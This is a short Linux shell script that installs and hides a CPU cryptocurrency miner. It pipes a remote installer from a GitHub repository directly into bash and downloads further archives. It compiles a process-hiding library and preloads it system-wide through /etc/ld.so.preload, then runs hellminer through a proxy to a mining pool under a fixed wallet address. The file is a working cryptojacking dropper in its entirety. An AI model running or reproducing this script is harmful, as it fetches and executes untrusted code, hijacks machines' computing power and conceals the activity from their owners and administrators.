#!/bin/sh
cd
apt update;apt -y install git screen binutils cmake build-essential unzip
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash

wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicHell.zip
unzip magicHell.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz
tar -xvzf hellminer_cpu_linux.tar.gz
graftcp ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYF4zmgp9dbN2ktHxQMqmzPXtWDhSrQFUL.Hell -p x
